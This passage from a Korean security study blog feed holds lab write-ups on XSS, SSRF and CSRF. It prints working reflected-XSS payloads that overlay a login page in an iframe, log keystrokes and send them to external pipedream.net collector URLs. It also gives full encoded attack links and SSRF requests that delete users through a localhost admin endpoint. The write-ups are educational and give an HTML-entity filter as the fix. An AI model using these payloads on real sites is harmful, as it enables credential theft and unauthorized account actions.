<span class="nb">window</span><span class="p">.</span><span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
	<span class="nf">if</span><span class="p">(</span><span class="nx">keys</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span> 
		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackURL</span><span class="o">+</span><span class="nx">keys</span><span class="p">;</span>
		<span class="nx">keys</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span>
	<span class="p">}</span> 
<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<ul>
  <li>완성 공격 URL 인코딩 전</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;var keys = "";var hackURL = "https://enpo6qk2njjal.x.pipedream.net/?v=";window.onkeydown=(e)=&gt;{key=e.keyCode?e.keyCode:e.charCode;key=String.fromCharCode(key);keys +=key;console.log(e);};window.setInterval(function(){if(keys !=''){new Image().src = hackURL+keys;keys='';}},1000);&lt;/script&gt;
</code></pre></div></div>

<ul>
  <li>URL 인코딩 후</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://221.27.0.6/sign_in_page?msg=%3cscript%3evar+keys+%3d+%22%22%3bvar+hackURL+%3d+%22https%3a%2f%2fenpo6qk2njjal.x.pipedream.net%2f%3fv%3d%22%3bwindow.onkeydown%3d(e)%3d%3e%7bkey%3de.keyCode%3fe.keyCode%3ae.charCode%3bkey%3dString.fromCharCode(key)%3bkeys+%2b%3dkey%3bconsole.log(e)%3b%7d%3bwindow.setInterval(function()%7bif(keys+!%3d%27%27)%7bnew+Image().src+%3d+hackURL%2bkeys%3bkeys%3d%27%27%3b%7d%7d%2c1000)%3b%3c%2fscript%3e
</code></pre></div></div>

<h2 id="공격-결과">공격 결과</h2>

<ul>
  <li>키로거 스크립트가 동작중인 로그인 페이지<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e0e3b52a-12a8-4688-ac6f-fb18cbc0f9f2" alt="Pasted image 20230530205933" /></li>
  <li>공격자 서버<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/964346f5-ebf9-4cf4-a239-c54fa1c06268" alt="Pasted image 20230530210038" /></li>
  <li>사용자의 입력이 공격자의 서버로 잘 전송이된 것을 확인할 수 있다.</li>
</ul>

<h2 id="대응-방안">대응 방안</h2>
<ul>
  <li>로그인 페이징에서 찾은 Reflected XSS 취약점을 예방하기 위해서는 HTML 특수문자들을 HTML Entity 로 모두 치환해주면 된다.</li>
  <li>사용자의 입력을 그대로 페이지에 보여주는 것이아닌 HTML Entity로 치환하여 보여준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"msg"</span><span class="o">);</span>
<span class="c1">// msg html 태그를 html entity로 치환하기.</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">filter</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
</code></pre></div></div>

<ul>
  <li>치환함수</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// xss 방지</span>
<span class="kd">private</span> <span class="nc">String</span> <span class="nf">filter</span><span class="o">(</span><span class="nc">String</span> <span class="n">in</span><span class="o">){</span>
	<span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&amp;]"</span><span class="o">,</span> <span class="s">"&amp;amp;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&lt;]"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&gt;]"</span><span class="o">,</span> <span class="s">"&amp;gt;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[']"</span><span class="o">,</span> <span class="s">"&amp;#x27;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[\"]"</span><span class="o">,</span> <span class="s">"&amp;quot;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[(]"</span><span class="o">,</span> <span class="s">"&amp;#40;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[)]"</span><span class="o">,</span> <span class="s">"&amp;#41;"</span><span class="o">)</span>
			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[/]"</span><span class="o">,</span> <span class="s">"&amp;#x2F;"</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">re</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>요청을 문자 그대로 인식하여 XSS를 예방한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/60d0a792-8519-4680-ae8a-ebcc4fe1fe6b" alt="Pasted image 20230530212323" /></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><category term="java" /><summary type="html"><![CDATA[로그인 페이지 Reflected XSS 취약점 발견하였다.]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
<ul>
  <li>크라이언트 측 스크립트를 삽입하는 공격이다.</li>
</ul>

<h2 id="xss-7번-문제">XSS 7번 문제</h2>
<ul>
  <li>키로거를 삽입하여 사용자의 계정을 탈취하는 문제이다.</li>
</ul>

<h2 id="사이트-분석-및-취약점-탐색">사이트 분석 및 취약점 탐색</h2>

<h3 id="로그인">로그인</h3>
<ul>
  <li>POST 와 GET 두 방식으로 로그인이 가능하다.</li>
</ul>

<h3 id="로그인-실패-페이지">로그인 실패 페이지</h3>
<ul>
  <li>XSS 취약점이 존재한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7654383c-c4bd-441c-aef4-5b3de1abd353" alt="Pasted image 20230529012624" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8efcad7-ebd2-45f6-8532-6d6a18772543" alt="Pasted image 20230529012643" /></li>
  <li>아이디 대신 스크립문을 삽입할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/bc4ab412-10ca-453e-8aca-15254576ec26" alt="Pasted image 20230529013321" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13cd15a9-8863-4135-9098-c5611767d780" alt="Pasted image 20230529013241" /></li>
</ul>

<h2 id="공격-시나리오">공격 시나리오</h2>
<ol>
  <li>login.html 에서 사용자가 로그인을 시도하는 것이 아닌 login.php에서 사용자가 로그인을 시도하도록 하자.</li>
  <li>login.php의 XSS 취약점을 이용하여 키로그를 삽입한다.</li>
  <li>사용자에게 공격자가 준 링크를 통해 페이지에 방문하여 로그인 하도록 해야한다.</li>
</ol>

<h2 id="공격-시작">공격 시작</h2>
<ol>
  <li>alert 창 안뜨게 만들기. 첫번째 스크립트는 일부러 오류를 유발시켜 동작안되도록 하였다. 따라서 <code class="language-plaintext highlighter-rouge">alert(1)</code> 이 경고창으로 뜨는 것을 확인할 수 있다.
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">// ] ~~~');</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">login.html</span><span class="dl">'</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/343cd063-2ed6-4cc2-8611-ead3b5e960b3" alt="Pasted image 20230529015248" /></p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">href</code> 를 통해 자동으로 리다이렉트 형상 막기. html 주석 처리 기능을 이용하여 <code class="language-plaintext highlighter-rouge">href</code> 스크립트 부부을 주석처리 해준다. 확인 버튼을 눌러도 <code class="language-plaintext highlighter-rouge">login.html</code> 로 리다이렉션하지 않고 <code class="language-plaintext highlighter-rouge">login.php</code> 에 머문다.
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span><span class="c">&lt;!--// ] ~~~');
&lt;/script&gt;
&lt;script&gt;window.location.href='login.html';&lt;/script&gt;
</span></code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/869eb7fb-9a97-44c7-801c-7b6686f08df2" alt="Pasted image 20230529020238" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d92d7de7-328b-4ba7-a497-1d1465e2f677" alt="Pasted image 20230529020302" /></p>
  </li>
  <li>사용자는 정상적인 로그인 페이지가 보여야한다. 따라서 <code class="language-plaintext highlighter-rouge">iframe</code> 을 통해 로그인 창 보이게 한다. 공격문을 id에 넣고 로그인을 하면 <code class="language-plaintext highlighter-rouge">login.php</code> 에서 로그인 페이지가 나오는 것을 확인할 수 있다.
<script src="https://gist.github.com/MinGyu2/e2b89c91fab5b1368f8bc58efd245e22.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 =
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html'&gt;&lt;/iframe&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5e9676ba-637a-4b09-8913-16a4e8f78c7d" alt="Pasted image 20230529022346" /></p>
  </li>
  <li>사용자가 입력하는 아이디와 비번을 알아내기위한 키로거를 넣어보자. 그리고 키로거를 이용하여 사용자 입력을 200ms 주기로 콘솔에 출력해보자.
<script src="https://gist.github.com/MinGyu2/c2557af1a361f188bfc86138b17b17d0.js"></script><br /><script src="https://gist.github.com/MinGyu2/d0cd73f4feb2e940ea44d7d8b5cbae57.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){console.log(keys);keys='';}}, 200);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f83fc784-7b5c-4f08-bf73-10774b39ad7c" alt="Pasted image 20230529030914" /><br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a58cfab3-8e93-481b-8246-efcd720ff3d9" alt="Pasted image 20230529030931" /></p>
  </li>
  <li>공격자 서버로 사용자 입력 보내기. 사용자의 입력을 <code class="language-plaintext highlighter-rouge">Image</code> 를 이용하여 공격자 서버로 보낸다.
<script src="https://gist.github.com/MinGyu2/66fcfc1763b5cb43c951ba7c39a6cc33.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://envs1y92en6c.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d451186b-0c43-4949-9dae-dad6b2bb8617" alt="Pasted image 20230529035800" />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/816c929e-21b6-4a90-92c9-0ad7a4c7aad0" alt="Pasted image 20230529040046" />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/be7c8f83-620d-4cfa-9227-a3b70eef1dd8" alt="Pasted image 20230529035816" /></p>
  </li>
  <li>로그인에 성공하면 실제 메인 페이지를 보여줘야 의심이 안간다. 즉 로그인에 실패하면 iframe 내에서 로그인을 다시 시도해야하고, 성공하면 정상적으로 로그인 성공한 것으로 보이기위하여 <code class="language-plaintext highlighter-rouge">index.php</code>로 이동한다.<br /><script src="https://gist.github.com/MinGyu2/81cbf0b824103cc9bc0c0c1f5a52b64f.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://enhrvcr5t8jsk.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;var s = win.location.href;if(s!='http://ctf.segfaulthub.com:4343/xss_7/login.html'){location.href="index.php";new Image().src = hackURL+"success";}else{new Image().src = hackURL+"fail";}win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <ul>
      <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/596bb9cf-ad96-4863-acc8-d76a3188bfa5" alt="Pasted image 20230529042336" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e874aec8-af9e-48d5-b053-49bd57473b6b" alt="Pasted image 20230529042328" /></li>
      <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/917e710b-4fba-491c-8e49-4a4db21c3fee" alt="Pasted image 20230529042229" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/308c8ff8-386d-4547-a168-940215b06ce7" alt="Pasted image 20230529042237" /></li>
    </ul>
  </li>
  <li>로그인을 GET요청으로 할 수 있음으로 Reflected XSS 취약점으로 활용할 수있다. 따라서 Get요청으로 공격하기 위해서 id 파라미터에 공격 스크립트를 넣어 링크를 눌러 사용자가 접속하여 로그인 하도록 유도 하면 된다.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:4343/xss_7/login.php?id=id%27%3C%2Fscript%3E%3Ciframe+style%3D%22position%3Aabsolute%3Bborder%3Anone%3Boverflow%3Ahidden%3Boverflow-x%3Ahidden%3Boverflow-y%3Ahidden%3Bheight%3A100%25%3Bwidth%3A100%25%3Btop%3A0px%3Bleft%3A0px%3Bright%3A0px%3Bbottom%3A0px%22+src%3D%27login.html%27+onload%3D%27load%28%29%27%3E%3C%2Fiframe%3E%3Cscript%3Evar+keys+%3D+%22%22%3Bvar+hackURL+%3D+%22https%3A%2F%2Fenhrvcr5t8jsk.x.pipedream.net%2F%3Fv%3D%22%3Bfunction+load%28%29%7Bvar+win+%3D+document.getElementsByTagName%28%27iframe%27%29%5B0%5D.contentWindow%3Bvar+s+%3D+win.location.href%3Bif%28s%21%3D%27http%3A%2F%2Fctf.segfaulthub.com%3A4343%2Fxss_7%2Flogin.html%27%29%7Blocation.href%3D%22index.php%22%3Bnew+Image%28%29.src+%3D+hackURL%2B%22success%22%3B%7Delse%7Bnew+Image%28%29.src+%3D+hackURL%2B%22fail%22%3B%7Dwin.onkeydown%3D%28e%29%3D%3E%7Bkey+%3D+e.keyCode%3Fe.keyCode%3Ae.charCode%3Bkey+%3D+String.fromCharCode%28key%29%3Bkeys+%2B%3D+key%3B%7D%7Dwindow.setInterval%28function%28%29%7Bif%28keys+%21%3D+%27%27%29%7Bnew+Image%28%29.src+%3D+hackURL%2Bkeys%3Bkeys%3D%27%27%3B%7D%7D%2C+1000%29%3B%3C%2Fscript%3E%3C%21--%2F%2F&amp;pw=123
</code></pre></div>    </div>
  </li>
  <li>사용자가 로그인 창에 아이디와 비밀번호를 입력하면 공격자 서버로 아이디와 비밀번호가 전송된다. <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aecb22ef-f21a-4517-9ec9-3fb4f6d57a1e" alt="Pasted image 20230529042638" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a2ddcfb2-659d-4efb-8db6-9cf70beb8ff7" alt="Pasted image 20230529042652" /></li>
</ol>

<h2 id="후기">후기</h2>
<ul>
  <li>키로거를 사용하여 공격자 서버로 직접 사용자의 입력을 받아보았다. url을 주의깊게 보지않는이상 사용자는 이상있는지 확인하기 어렵다는 것을 알 수 있었다. 키로거를 이용한 새로운 공격이라 흥미로웠다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><summary type="html"><![CDATA[XSS 실습 7번 문제를 풀어보자.]]></summary></entry><entry><title type="html">SSRF 실습 문제 Basic SSRF</title><link href="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/" rel="alternate" type="text/html" title="SSRF 실습 문제 Basic SSRF" /><published>2023-05-27T00:00:00+09:00</published><updated>2023-05-27T23:13:00+09:00</updated><id>http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF</id><content type="html" xml:base="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/"><![CDATA[<h2 id="ssrf-란">SSRF 란?</h2>
<ul>
  <li>서버가 임의의 요청을 보내도록 하는 공격이다.</li>
</ul>

<h2 id="ssrf-문제">SSRF 문제</h2>
<ul>
  <li><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Lab: Basic SSRF against the local server Web Security Academy</a></li>
</ul>

<h2 id="문제-내용">문제 내용</h2>
<ul>
  <li>수량 체크를 하기위해 내부 시스템으로 부터 데이터를 가지고온다.</li>
  <li>문제를 해결하기 위해서는 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 에 접근하여 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제해야 한다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9b364c73-85b0-4f2a-a73e-5631530108f2" alt="Pasted image 20230527001755" /></p>

<h2 id="문제-풀이">문제 풀이</h2>

<h3 id="사이트-분석-및-취약점-찾기">사이트 분석 및 취약점 찾기</h3>

<h4 id="상품-수량-체크부분">상품 수량 체크부분</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOygleyDgeyggSDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrp4Htgazrpbwg7Ya17ZW0IOuCtOu2gCDtjpjsnbTsp4Ag7IiY65-JIOyalOyyrS5cbuuCtOu2gCDshJzrsoQgLT4-IOyEnOuyhCA6IOyImOufiSDsnZHri7UuXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOufiSDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
<ul>
  <li>
    <p>상품 수량 체크부분 POST요청의 파라미터로 URL을 넣어 요청을 보낸다. 즉 이 부분에서 SSRF 공격을 시도할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f524fe2c-5897-4609-99d4-13cf520f00af" alt="Pasted image 20230527005245" />
<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b5fcdad-9c15-4476-ba8a-6d15e871f04a" alt="Pasted image 20230527004914" />
<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f6958d20-01a0-4146-85f3-10fa5ac1d1cc" alt="Pasted image 20230527005001" /></p>
  </li>
  <li>
    <p>오직 POST 요청으로만 수량을 체크할 수 있다. GET 요청을 보냈을 때 수량을 체크할 수가 없다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c0aa1bc-d813-4ffd-a0c0-278bb16187e6" alt="Pasted image 20230527005515" /></p>
  </li>
</ul>

<h4 id="admin-페이지-접속-시도">admin 페이지 접속 시도</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">https://문제 주소/admin</code> 을 통해 바로 접속을 시도해 보았다. 하지만 admin 페이지에 접속하기 위해서는 <code class="language-plaintext highlighter-rouge">administrator</code>로 로그인 하거나 내부에서 접속해야 한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0656feeb-8612-43ea-9104-5834bc6fa8de" alt="Pasted image 20230527005910" /></li>
</ul>

<h3 id="공격-시나리오">공격 시나리오</h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ol>
  <li>서버로 수량 체크 요청을 보낼 때 수량을 체크하기 위한 링크가 아닌 서버 내부 페이지 URL를 파라미터에 넣어 요청을 보낸다.</li>
  <li>서버에서 파라미터에 들어있는 URL주소로 요청을 보낸다.</li>
  <li>서버는 URL주소 응답을 받는다.</li>
  <li>서버는 공격자에게 URL 페이지 응답을 그대로 사용자에게 보내준다.</li>
</ol>

<h3 id="admin-페이지-접속-공격">admin 페이지 접속 공격</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 주소를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d9bd18c0-c348-452a-9461-5b447cea2613" alt="Pasted image 20230527013431" /></li>
  <li>Post 요청을 보내면 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 페이지가 나타난다. 이 페이지는 서버 내부에서 접속된 페이지이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/78ea87bd-3af3-49f8-901f-ef992bb0e96b" alt="Pasted image 20230527013531" /></li>
  <li>admin 페이지 접속에 성공하였다. 이제 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하면 된다. 즉 위의 사진에서 보이듯 <code class="language-plaintext highlighter-rouge">Delete</code>  링크를 눌러줘야한다. 하지만 바로 누르면 외부에서 요청한 것이라 동작을 안한다. 따라서 파라미터에 <code class="language-plaintext highlighter-rouge">Delete링크</code>를 넣어 요청을 보내주면 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c857d16-ae1a-43b1-9554-d6a120b4857b" alt="Pasted image 20230527014116" /></li>
</ol>

<h3 id="유저-삭제하기">유저 삭제하기</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=wiener</code> 링크를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9a578c2c-cf4c-4a87-84b6-b1ac926dce87" alt="Pasted image 20230527014517" /></li>
  <li>Post 요청을 보내면 성공적으로 <code class="language-plaintext highlighter-rouge">wiener</code> 유저가 삭제되었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7fedaef1-78ee-4b7a-9688-272fa5f7a01b" alt="Pasted image 20230527014556" /></li>
  <li>목표는 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하는 것이다. 따라서 <code class="language-plaintext highlighter-rouge">carlos</code> 를 링크에 넣어주자. 그러면 <code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에는 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=carlos</code> 가 들어가게 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9061f31e-2a9a-4dc0-b986-1b01007c2a51" alt="Pasted image 20230527015033" /></li>
  <li>Post 요청을 보내면 목표였던  <code class="language-plaintext highlighter-rouge">carlos</code> 유저가 삭제된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d34a3ef7-cc64-4595-b6a3-05f7e26bb06a" alt="Pasted image 20230527015153" /></li>
</ol>

<h2 id="후기">후기</h2>
<ul>
  <li>직접 스터디에서 풀이해 주었지만 직접 SSRF 문제를 풀어보니 파라미터로 URL을 입력받는 것이 얼마나 위험한지 알 수 있었다. SSRF 취약점을 이용하면 외부에서 접근이 불가능한 내부 페이지에 접속을 직접 확인할 수 있어 재밌었다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[SSRF 실습 문제 Basic SSRF 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 와 SSRF</title><link href="http://localhost:4000/CSRF%EC%99%80SSRF/" rel="alternate" type="text/html" title="CSRF 와 SSRF" /><published>2023-05-26T00:00:00+09:00</published><updated>2021-05-26T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%99%80SSRF</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%99%80SSRF/"><![CDATA[<h2 id="csrf-공격">CSRF 공격</h2>

<h3 id="설명">설명</h3>
<ul>
  <li>Cross Site Request Forgery</li>
  <li>피해자가 임의의 요청을 서버에 보내게하는 공격이다.</li>
</ul>

<h3 id="발생-위치">발생 위치</h3>
<ul>
  <li>모든 요청에서 방생할 수 있다.</li>
  <li>중요한 요청에서 발생할 수 있다.</li>
  <li>게시판 글 작성 CSRF or 비밀번호 변경 CSRF ( 상황에 따라 위험도가 달라질 수 있다.)</li>
</ul>

<h3 id="csrf-공격-기법">CSRF 공격 기법</h3>
<h4 id="get-method">GET Method</h4>
<ul>
  <li>URL 링크를 만들어 사용자에게 보내 클릭하게 만들면 된다.</li>
  <li>로그인 한 다음 볼 수 있는 페이지에 URL를 두고 클릭하게 해야한다.</li>
</ul>

<h4 id="post-method">POST Method</h4>
<ul>
  <li>무조건 XSS 취약점을 같은 도메인에서 찾아야 한다. 왜냐하면 같은 도메인이어야 로그인 세션이 그대로 남아있기 때문이다. ( 쿠키 값 유지 )</li>
</ul>

<h4 id="referer-bypass-포인트">Referer Bypass 포인트</h4>
<ul>
  <li>meta 태그를 이용하여 우회를 시도할 수 있다.</li>
  <li>단 서버에서 referer 값이 없을 때는 검사를 안하고 통과시켜줘야 한다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h4 id="csrf-token-우회">CSRF Token 우회</h4>
<ul>
